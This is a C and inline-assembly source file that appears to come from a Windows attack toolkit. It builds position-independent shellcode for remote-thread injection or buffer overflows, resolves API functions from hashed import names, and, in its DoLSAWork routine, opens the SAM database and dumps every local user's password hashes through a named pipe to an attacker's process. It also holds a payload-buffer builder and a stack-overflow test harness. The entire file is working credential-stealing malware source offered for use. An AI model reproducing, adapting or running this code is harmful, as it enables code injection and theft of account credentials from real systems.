#include "payload.h"

#pragma warning(disable : 4035)
#pragma warning(disable : 4102)

//////////////////////////////////////////////////////////////////////////////////////////////
// FUSION Technqiue - drop some code into the remote thread
// as we are so el8 - we do not use an additional DLL - we PE patch it right here
//
// ALWAYS BUILD IN RELEASE MODE!!!
//////////////////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////////////////
// START FUSION Technique
//
// be careful with compiler - this is touchy under VC++ - it must always be built clean
// and from scratch - else the compiler might screw up the serialized nature
// of these functions calls 
//////////////////////////////////////////////////////////////////////////////////////////////

#pragma check_stack (off) 
static DWORD WINAPI attack_thread(LPVOID theParam) 
{	
	//////////////////////////////////////////////////////////
	// This is a self sufficient code stream.
	// First, it will examine the PE header to get the
	// addresses for LoadLibrary and GetProcAddress.
	// Once these have been obtained, it will load
	// a single routine, ExitThread() and call it.
	//
	//////////////////////////////////////////////////////////
	__asm
	{
		//int 3
		//////////////////////////////////////////////////////
		// this bearings call is not buffer-overflow safe -
		// it compiles to contain a NULL character.  If you
		// are using this for a buffer overflow, use the
		// reverse bearings trick instead.
		//////////////////////////////////////////////////////
		call	RELOC
RELOC:	pop		edi			// standard call to get bearings
							// edi will have previous eip
		
		//////////////////////////////////////////////////////
		// make room for variables
		//////////////////////////////////////////////////////
		sub		esp, 1024

		//////////////////////////////////////////////////////
		// ebp forms the base of all data operations and
		// temporary storage.  All function addresses are
		// referenced off of ebp.
		//////////////////////////////////////////////////////
		mov		ebp, esp
		
		//////////////////////////////////////////////////////
		// FOR BUFFER OVERFLOWS ONLY:
		// ebp is now pointing to current code location,
		// adjust it forward past all of our data sections
		// -be careful with arithmetic-
		// stack should look like this:
		// 00 code
		// 11 code
		// 22 code
		// 33 data <strings>
		// 44 data <strings>
		// 55 .... 
		// 66 ebp base
		// 77 .... <jump table>
		// 88 .... <scratch pad 'heap'>
		// 99 ....
		//////////////////////////////////////////////////////
		// add		ebp, 1500

GET_DATA_SECTION:
		//////////////////////////////////////////////////////
		// loop until we get to the data
		// section, as marked by the
		// canary value, which is -1 (0xFFFFFFFF)
		//////////////////////////////////////////////////////
		inc		edi
		cmp		dword ptr [edi], -1
		jne		GET_DATA_SECTION
		add		edi, 4			// get past canary itself (+4 bytes)
		mov		esi, ebp		// get output ptr ready, 
								// we are going to write a table
								// to [ebp + n] thru esi
GET_PRELOADED_FUNCTIONS:
		//////////////////////////////////////////////////////
		// get pointers to preloaded
		// functions, based on checksum
		// of function name, uses
		// PE header's import table
		// -NULL DWORD terminates
		//
		// the checksums were all pre-
		// setup when this code buffer
		// was built
		//
		// edi is pointing to data table
		// which has DWORD checksums
		// that will be replaced with 
		// actual function values when the
		// checksum matches.  If the
		// checksum doesn't match, we are
		// critical dead-meat.
		///////////////////////////////////////////////////////		
		mov		eax, dword ptr [edi]
		cmp		eax, 0					// make sure [edi] isn't NULL
		je		DONE_PRELOAD
		
		////////////////////////////////////////
		// build_rvas() uses edi, so save value.
		// we pass checksum in thru edi
		// we expect function addr to come back
		// in edi.  Double check to make sure.
		// _DIE_ if we don't find it!
		////////////////////////////////////////
		push	edi
		mov		edi, eax

		call	build_rvas
		cmp		eax, edi
		jne		GOOD_CALL
		
		//////////////////////////////////////////////
		// BADNESS. failed to find function, exit NOW
		// - did not find a hashed function -
		//////////////////////////////////////////////
		pop		edi
		int		3
		
GOOD_CALL:
		mov		dword ptr [esi], edi		// GetProcAddress
		pop		edi

		add		esi, 4						// move on to next entry
		add		edi, 4						// move on to next entry

		jmp		GET_PRELOADED_FUNCTIONS

		DONE_PRELOAD:
		add		edi, 4		// get past NULL

LOAD_DLL_FUNCTIONS:
		//////////////////////////////////////////////////////////
		// load new DLL's and functions
		// that are not currently in the
		// process import table.  We call
		// loadlibrary() for each DLL specified in the
		// data section - followed by GetProcAddress()
		// for each function we want to load.
		//
		// Once obtained, the function address is placed in 
		// [ebp + n] so it can later be called by reference thru
		// the ebp register.  Note the #defines at the top of this
		// file for convenience.  EBP IS GLOBAL UNLESS OTHERWISE
		// PUSHED!
		//////////////////////////////////////////////////////////
		cmp		byte ptr [edi], 0
		je		LOAD_DATA				// double NULL means done
		lea		eax, [edi]				// load DLL name	
		
		//////////////////////////////////////////////////////////
		// use this unicode converter if using loadlibraryW
		//////////////////////////////////////////////////////////
		call	convert_ascii_to_unicode
		
		push	eax
		call	LOAD_LIBRARYW
		cmp		eax, 0
		je		ALL_DONE				// not found error
		mov		edx, eax				// DLL handle

		///////////////////////////////////////////////////////////
		// load functions, ignore ecx - it's a hack so 'repne scas'
		// fill fast forward thru the function table...
		///////////////////////////////////////////////////////////
		mov		ecx, 10000
		
NEXT_UNICODE:
		cmp		[edi], 0
		je		SKIP_UNICODE
		inc		edi
		inc		edi
		jmp		NEXT_UNICODE
		
SKIP_UNICODE:
		inc		edi
		///////////////////////////////////////////////////
		// edi now skipped past the unicode string that was the 
		// DLL name...
		///////////////////////////////////////////////////
NEXT_FUNCTION:
		xor		eax, eax
		repne scas

		cmp		byte ptr [edi], 0
		je		FUNCTION_DONE			//done loading functions

		push	edx						//save DLL handle

		push	edi
		push	edx
		call	GET_PROC_ADDRESS
		
		pop		edx						//restore DLL handle

		cmp		eax, 0					//missing functions, barf
		je		ALL_DONE
		
		mov		dword ptr [esi], eax
		add		esi, 4
		jmp		NEXT_FUNCTION

FUNCTION_DONE:
		inc		edi						// get past NULL
		jmp		LOAD_DLL_FUNCTIONS		// next DLL
	
LOAD_DATA:
	
		xor		eax, eax
		repne scas
		cmp		byte ptr [edi], 0
		je		ALL_DONE				//done loading data

		mov		dword ptr [esi], edi	//save ptr to data item 
		add		esi, 4
		jmp		LOAD_DATA

ALL_DONE:
		//int		3
		push	ebp
		call	do_something_useful		
		ret
	}
}

/////////////////////////////////////////////////
// UTILITY FUNCTION
// we must locate the base of this image in 
// memory - el8 PE scanner method
/////////////////////////////////////////////////
static __declspec(naked) void scan_for_PE_base(void)
{
	__asm
	{
		push	ebx
		push	ecx
		push	edx
		push	esi
		push	edi

		//////////////////////////////////////////////////////////////////////////
		// set up an exception handler
		//////////////////////////////////////////////////////////////////////////
		call NEXTNEXT
NEXTNEXT:
		pop		edi		// edi has our current location in code
		add		edi, 26	// BE CAREFUL w/ Arithmetic
						// -> fast forward [edi] to the exception handler address
		
		push	edi				// our handler
		push	fs:[0]			// ptr to old handler
		mov		fs:[0], esp		// register our new handler
		
		mov		ebx, 0x00100000 //start scanning at segment 0x0040 and go from there
		jmp		AFTER_EXCEPTION_HANDLER

EXCEPTION_HANDLER:
		//////////////////////////////////////////////////////////////////
		// oops, we tried to access something bad - skip to next segment
		//
		// the OS will push 4 ptr's onto the stack
		// the 3rd is a context record in which we can alter ebx and
		// try the call again
		///////////////////////////////////////////////////////////////////
		push	ebp
		mov		ebp, esp
		push	ebx

		// get context record
		mov         eax,dword ptr [ebp+10h]
		// get old value of ebx
		mov         ebx, dword ptr [eax+0A4h]
		// fixup and write back
		add		ebx, 0x00010000
		mov     dword ptr [eax+0A4h], ebx
		
		pop		ebx
		xor		eax, eax
		mov		esp, ebp
		pop		ebp
		ret

ADD_MORE_TO_EBX:
		add		ebx, 0x00010000

AFTER_EXCEPTION_HANDLER:
		////////////////////////////////////////////////////////////////////
		// start scanning memory in a way that may cause an exception.
		// we are looking for the base of a PE image.  It will start with
		// the 'MZ' string - hence our compare.  
		//
		// Note that we may find a DLL before we find the EXE.  In practice
		// this has never happened, the exe is always loaded first - but
		// if we do hit a DLL first we will most surely BARF it. 
		//
		// If you get a crash - first check w/ SoftIce to see if there was 
		// a DLL loaded before the EXE in memory - that is the cause then.
		// For now - we defer that bug.
		/////////////////////////////////////////////////////////////////////
		mov		eax, [ebx]
		
		/////////////////////////////////////////////////////////////////////
		// if we are here, we didn't throw
		// check for the standard PE bytes, go to next
		// segment if we don't find it...
		/////////////////////////////////////////////////////////////////////
		cmp		eax, 0x00905A4D
		jne		ADD_MORE_TO_EBX

		/////////////////////////////////////////////////////////////////////
		// we found a PE, ebx is our base
		// return in eax
		//
		// FIXME: In the future, add a check to verify this is an EXE and not
		// a DLL - in practice we have never hit a DLL with this, but it is
		// possible.
		/////////////////////////////////////////////////////////////////////
		mov		eax, ebx
		
DONE_SCANNING:
		/////////////////////////////////////////////////////////////////////
		// restore old exception frame
		/////////////////////////////////////////////////////////////////////
		mov		ebx, [esp]		// get ptr to previous record
		mov		fs:[0], ebx		// install previous record
		add		esp, 8			// clean our expception record off of the stack

		pop		edi
		pop		esi
		pop		edx
		pop		ecx
		pop		ebx

		ret
	}
}

/////////////////////////////////////////////////////////////////////////////////
// UTILITY FUNCTION: lookup function ptr in PE's .idata section based on checksum
// - argument (checksum) passed in edi
// - returns function ptr in edi
//
// Gets the base of the EXE's PE on every call - which is not optimized.  In the
// future we should pass in the PE base as an argument.
/////////////////////////////////////////////////////////////////////////////////
static __declspec(naked) void build_rvas()
{
	__asm
	{
		push	eax
		push	ebx
		push	ecx
		push	edx
		push	esi

		call	scan_for_PE_base	// eax will contain base of PE
		push	eax					// put our PE base at [esp]

		mov		ebx, [esp]
		add		ebx, 0x0000003C		// start of PE header in memory
		mov		ecx, [ebx]
		add		ecx, [esp]
		add		ecx, 0x00000004		// beginning of COFF header, fill in data
				
		lea		eax, [ecx + 0x14]	// optional header offset
		mov		esi, [eax + 68h]	// offset to .idata data directory
		add		esi, [esp]

NEXT_DLL:
		//////////////////////////////////////////////////////////////////////////////
		// esi holds data directory offset - the 'DIRECTORY'
		// we are now pointing to the .idata section in the PE header
		//////////////////////////////////////////////////////////////////////////////

									//////////////////////////////////////////////////
		mov		eax, [esi]			// RVA of Import Lookup Table - the 'LOOKUP'
		cmp		eax, 0				// zero means end of table
									// 
									// eax holds a pointer to the string name
									// of the function (unless imported by ordinal)
									//////////////////////////////////////////////////
		je		DONE_LOADING
		add		eax, [esp]
									//////////////////////////////////////////////////
		mov		edx, [esi + 16]		// RVA of 'THUNK' table - edx now holds ptr to 
									// actual function addresses.
									//////////////////////////////////////////////////
		add		edx, [esp]

NEXT_FUNCTION:
		mov		ebx, [eax]			// 'LOOKUP' 32 bit value
		mov		ecx, ebx
		and		ecx, 0x80000000		// make sure this isn't by ordinal
		cmp		ecx, 0
		jne		SKIP_ORDINAL
		
		//////////////////////////////////////////////////////////////////////////////
		// we are here if the table pointed to by eax has ascii names
		//////////////////////////////////////////////////////////////////////////////
		add		ebx, [esp]			// correct for the RVA of 'HINT' (ascii name)
		
		//////////////////////////////////////////////////////////////////////////////
		// function lookup by checksum, loops several times using ebx as a (char *)
		//////////////////////////////////////////////////////////////////////////////
		add		ebx, 2				// skip first 2 bytes
		xor		ecx, ecx
_F1:
		xor		cl, byte ptr [ebx]
		rol		ecx, 8
		inc		ebx
		cmp		byte ptr [ebx], 0
		jne		_F1
		
		//////////////////////////////////////////////////////////////////////////////
		// checksum calculation is complete, compare against edi, which was passed in
		//////////////////////////////////////////////////////////////////////////////
		cmp		ecx, edi				// compare destination checksum
		jne		_F3
		mov		edi, [edx]
		jmp		DONE_LOADING
		
_F3:
		//////////////////////////////////////////////////////////////////////////////
		// we are here if we didn't find the checksum, so jump to the next function
		// entry and try again.
		//////////////////////////////////////////////////////////////////////////////
		add		edx, 4					// next entry in 'THUNK' table
		add		eax, 4					// next entry in import table
		cmp		dword ptr [eax], 0		// zero means end of table
		jnz		NEXT_FUNCTION

SKIP_ORDINAL:
		//////////////////////////////////////////////////////////////////////////////
		// since we are scanning every imported DLL, we must jump to the next one
		// when the current table is exhausted.  
		//////////////////////////////////////////////////////////////////////////////
		add		esi, 20
		jmp		NEXT_DLL

DONE_LOADING:
		add		esp, 4			// clean our PE base off of the stack

		pop		esi
		pop		edx
		pop		ecx
		pop		ebx
		pop		eax

		ret
	}
}

//////////////////////////////////////////////////////////////////////////////////////
// UTILITY FUNCTION - converts a 'pseudo-unicode' string to actual unicode
// string ptr passed in eax
// expected format S.T.R.I.N.G
// where every '.' character will get
// replaced with NULL.  Must be terminated with a 'Z\0'.
//////////////////////////////////////////////////////////////////////////////////////
static __declspec(naked) void convert_ascii_to_unicode(void)
{
	__asm
	{
		push	ebx
		mov		ebx, eax
NEXT_CHAR:
		inc		ebx
		mov		byte ptr [ebx], 0
		inc		ebx
		cmp		byte ptr [ebx], 'Z'	// end tag
		jne		NEXT_CHAR
		// null out the end tag for a double null terminated UNICODE string
		mov		byte ptr [ebx], 0
		
		pop		ebx
		ret
	}
}

////////////////////////////////////////////////////////////////////////////////
// Code to your little hearts content here...
// ------------------------------------------
//
// This function will be called in a nice, safe thread for you to do whatever
// you want with. ;-)
//
// Make sure you call ExitThread() at the end so we are nice and clean.
//
////////////////////////////////////////////////////////////////////////////////
static void __stdcall do_something_useful( MY_FUNCTION_TABLE *MFT )
{
	////////////////////////////////////////////////////////////////////////////
	// On entry, our entire jump table will be passed as a ptr. 
	// This to a 'c' style struct and we can make all calls in 'c'
	// from this point forward.  This will be easier than hand-crufting all
	// function calls in assembly.
	////////////////////////////////////////////////////////////////////////////

	char test_string[255];
	HANDLE aNamedPipeH = 0;

	// debugging !!!
	__asm int 3
	// debugging !!!
	
	/////////////////////////////////////////////////////////
	// Example of string usage - never pass a string literal
	// - always use the MFT pointers -
	/////////////////////////////////////////////////////////
	f_snprintf( test_string, 253, MFT->pDATA.mHelloString); 
	__asm nop
	__asm nop
	fOutputDebugString( test_string );
	__asm nop
	__asm nop

	
	/////////////////////////////////////////////////////////////////////////////
	// open handle to attacker's process
	/////////////////////////////////////////////////////////////////////////////
	aNamedPipeH = fCreateFileA(MFT->pDATA.mPipeName, GENERIC_WRITE, 0, NULL, 
							   OPEN_EXISTING, FILE_FLAG_WRITE_THROUGH, NULL );
	if(INVALID_HANDLE_VALUE == aNamedPipeH)
	{
		// error
		goto EXIT_OUT;
	}

	/////////////////////////////////////////////////////////////////////////////
	// do some real work
	/////////////////////////////////////////////////////////////////////////////
	DoLSAWork(MFT, aNamedPipeH);	
	
	
EXIT_OUT:
	/////////////////////////////////////////////////////////////////////////////
	// we are done ;-)
	/////////////////////////////////////////////////////////////////////////////
	fExitThread(666);
}

DWORD __stdcall SendPipeData( MY_FUNCTION_TABLE *MFT, HANDLE thePipeH, const char *theText)
{
	DWORD aNumWritten;
	if(!fWriteFile(		thePipeH,
						theText,
						f_strlen(theText),
						&aNumWritten,
						NULL))
	{
		// error
	}
	return 0;
}

DWORD __stdcall mp (int c)
{
    return ((c >= ' ') && (c <= '~'));
}

DWORD __stdcall
DumpPayload(MY_FUNCTION_TABLE *MFT,
			HANDLE thePipe, 
			unsigned char *aPayloadP, 
			size_t size)
{
    char aBuffer[256];

    while (size > 16) 
	{
        f_snprintf(aBuffer, sizeof(aBuffer),
                   " %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X  %c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c\n",
                   aPayloadP[0], 
				   aPayloadP[1], 
				   aPayloadP[2], 
				   aPayloadP[3], 
				   aPayloadP[4], 
				   aPayloadP[5], 
				   aPayloadP[6], 
				   aPayloadP[7],
                   aPayloadP[8], 
				   aPayloadP[9], 
				   aPayloadP[10], 
				   aPayloadP[11], 
				   aPayloadP[12], 
				   aPayloadP[13], 
				   aPayloadP[14], 
				   aPayloadP[15],
                   mp(aPayloadP[0]) ? aPayloadP[0] : '.',
                   mp(aPayloadP[1]) ? aPayloadP[1] : '.',
                   mp(aPayloadP[2]) ? aPayloadP[2] : '.',
                   mp(aPayloadP[3]) ? aPayloadP[3] : '.',
                   mp(aPayloadP[4]) ? aPayloadP[4] : '.',
                   mp(aPayloadP[5]) ? aPayloadP[5] : '.',
                   mp(aPayloadP[6]) ? aPayloadP[6] : '.',
                   mp(aPayloadP[7]) ? aPayloadP[7] : '.',
                   mp(aPayloadP[8]) ? aPayloadP[8] : '.',
                   mp(aPayloadP[9]) ? aPayloadP[9] : '.',
                   mp(aPayloadP[10]) ? aPayloadP[10] : '.',
                   mp(aPayloadP[11]) ? aPayloadP[11] : '.',
                   mp(aPayloadP[12]) ? aPayloadP[12] : '.',
                   mp(aPayloadP[13]) ? aPayloadP[13] : '.',
                   mp(aPayloadP[14]) ? aPayloadP[14] : '.',
                   mp(aPayloadP[15]) ? aPayloadP[15] : '.');
        SendPipeData(MFT, thePipe, aBuffer);
        aPayloadP += 16;
        size -= 16;
    }

    if(size) 
	{
        char buf2[17];
        int i = 0;
        int j = 16 - size;
        memset (buf2, 0, sizeof(buf2));
        aBuffer[0] = 0;
        
		while(size--) 
		{
            f_snprintf (aBuffer+strlen(aBuffer),
                       sizeof(aBuffer) - strlen(aBuffer),
                       " %02X", *aPayloadP);
            if (mp(*aPayloadP))
                buf2[i++] = *aPayloadP;
            else
                buf2[i++] = '.';
            aPayloadP++;
        }
        f_snprintf(aBuffer+strlen(aBuffer),
                   sizeof(aBuffer)-strlen(aBuffer),
                   "%*s%s\n", 
				   j*3 + 2, 
				   "", 
				   buf2);
        SendPipeData(MFT, thePipe, aBuffer);
    }
	return 0;
}


DWORD __stdcall DoLSAWork( MY_FUNCTION_TABLE *MFT, HANDLE theNamedPipeH )
{
	HPOLICY aPolicyH = 0;
    HSECRET aSecretH = 0;
    int		aCount = 0;
	PLSA_UNICODE_STRING aSystemName = NULL;
	LSA_HANDLE anLsaH = 0;
	LSA_OBJECT_ATTRIBUTES lsaObjAttr;
	POLICY_ACCOUNT_DOMAIN_INFO* domainInfo;
	HSAM hSam;
	HDOMAIN hDomain = 0;
	DWORD enumD;
	DWORD numRet;
	SAM_USER_ENUM *samEnum = NULL;
	HUSER userH = 0;

	NTSTATUS ret, enumRet;

	memset(&lsaObjAttr, 0, sizeof(lsaObjAttr));
	lsaObjAttr.Length = sizeof(lsaObjAttr);

	// open the policy database
	ret = fLsaOpenPolicy (	aSystemName,
							&lsaObjAttr,
							POLICY_ALL_ACCESS,
							&anLsaH);
	if(ret < 0)
	{
		//error
		return ret;
	}

	ret = fLsaQueryInformationPolicy(	anLsaH,
										PolicyAccountDomainInformation,
										&domainInfo);
	if(ret != ERROR_SUCCESS)
	{
		//error
		return ret;
	}

	// connect to the sam database:
	ret = fSamIConnect(0, &hSam, MAXIMUM_ALLOWED, 1);

	if (ret < 0)
	{
		//error
		return ret;
	}

	ret = fSamrOpenDomain (hSam, 0xf07ff, domainInfo->DomainSid, &hDomain);

	if (ret < 0)
	{
		//error
		return ret;
	}

	do
	{
		enumRet = fSamrEnumerateUsersInDomain(hDomain, &enumD, 0, &samEnum, 1000, &numRet);

		if (0 == enumRet || 0x105 == enumRet)
		{
			int i;
			for (i = 0; i < numRet; i++)
			{
				char userName[256];
				wchar_t buff[256];
				DWORD size;
				PVOID userInfo = 0;

				ret = fSamrOpenUser (hDomain, MAXIMUM_ALLOWED, samEnum->users[i].rid, &userH);

				if (ret < 0)
				{
					// error
					return ret;
				}

				ret = fSamrQueryInformationUser( userH, SAM_USER_INFO_PASSWORD_OWFS, &userInfo);

				if (ret < 0)
				{
					// error
					return ret;
				}

				size = min ((sizeof (buff)/sizeof(wchar_t)) -1, samEnum->users[i].name.Length/2);
				wcsncpy(buff, samEnum->users[i].name.Buffer, size);
				buff[size] = L'\0';
				WideCharToMultiByte(CP_ACP, 0, buff, -1, userName, sizeof(userName), 0, 0);
				userName[sizeof(userName)-1] = '\0';

				__try
				{
					PBYTE pb = (PBYTE) userInfo;
					char theBuff[1024];
					DWORD written;

					_snprintf(theBuff, sizeof(theBuff), "%s:%d:"
						"%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x:"
						"%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x:::\n",
						userName, samEnum->users[i].rid,
						pb[16], pb[17], pb[18], pb[19], pb[20], pb[21], pb[22], pb[23],
						pb[24], pb[25], pb[26], pb[27], pb[28], pb[29], pb[30], pb[31],
						pb[0], pb[1], pb[2], pb[3], pb[4], pb[5], pb[6], pb[7],
						pb[8], pb[9], pb[10], pb [11], pb[12], pb[13], pb[14], pb[15]);

					ret = WriteFile (theNamedPipeH, theBuff, strlen(theBuff), &written, NULL);

					if (!ret)
					{
						//error
						return ret;
					}
				}
				__except(EXCEPTION_EXECUTE_HANDLER)
				{

				}

				fSamIFree_SAMPR_USER_INFO_BUFFER(userInfo, SAM_USER_INFO_PASSWORD_OWFS);

				userInfo = 0;
				fSamrCloseHandle (&userH);
				userH = 0;
			}

			fSamIFree_SAMPR_ENUMERATION_BUFFER (samEnum);
			samEnum = NULL;
		}
		else
		{
			// enumeration failed
			return 1;
		}
	} while ( 0x105 == enumRet );

	//cleanup
	
	return 0;
}


//////////////////////////////////////////////////////////////////////////////////////////////
// this is a placeholder and is required to calculate code size - it must come last
//////////////////////////////////////////////////////////////////////////////////////////////
static void after_attack(void) { } 
#pragma check_stack 
//////////////////////////////////////////////////////////////////////////////////////////////
// END FUSION Technqiue 
//////////////////////////////////////////////////////////////////////////////////////////////



///////////////////////////////////////////////////////////////////////////////////////////////
// extra crap
///////////////////////////////////////////////////////////////////////////////////////////////
BOOL BuildPayloadBuffer( char **theBuffer, int *theLen )
{
	char *curr; 
	void *code_segment = (void *) attack_thread;
	void *after_code_segment = (void *) after_attack;
	unsigned long code_len = (long)after_code_segment - (long)code_segment;
	unsigned long data_len = (sizeof(DWORD) * (sizeof(MY_FUNCTION_TABLE) + 1)) + sizeof(data) + 200;

	char *aPayload = malloc(code_len + data_len);
	memset(aPayload, 'A', code_len + data_len);
	memcpy(aPayload, code_segment, code_len);

	// write data portion
	curr = aPayload + code_len;

	*((DWORD *)curr+0) =  0xFFFFFFFF; //canary value
	*((DWORD *)curr+1) =  GetChecksum("GetProcAddress");
	*((DWORD *)curr+2) =  GetChecksum("LoadLibraryW");
	*((DWORD *)curr+3) =  0; //NULL
	
	memcpy(((DWORD *)curr+4), (char *)data, sizeof(data) + 100);

	*theLen = code_len + data_len;
	*theBuffer = aPayload;

	// overflow ourselves as a test
	//test_me(aPayload); ExitProcess(1);
	
	return TRUE;
}

// for testing the payload on the stack (no injection vector)
void test_me(char *input_ptr)
{
	char too_small[2000];
	char *i = too_small;
	memcpy(too_small, input_ptr, 2000);
	__asm	mov	eax, i
	__asm   call eax
}

DWORD GetChecksum( char *p )
{
	DWORD aChecksum = 0;
	__asm
	{
		xor		eax, eax
		mov		esi, p
ALOOP:		
		xor		al, byte ptr [esi]
		rol		eax, 8
		inc		esi
		cmp		byte ptr [esi], 0
		jne		ALOOP
		mov		dword ptr [aChecksum], eax
	}

	return aChecksum;
}
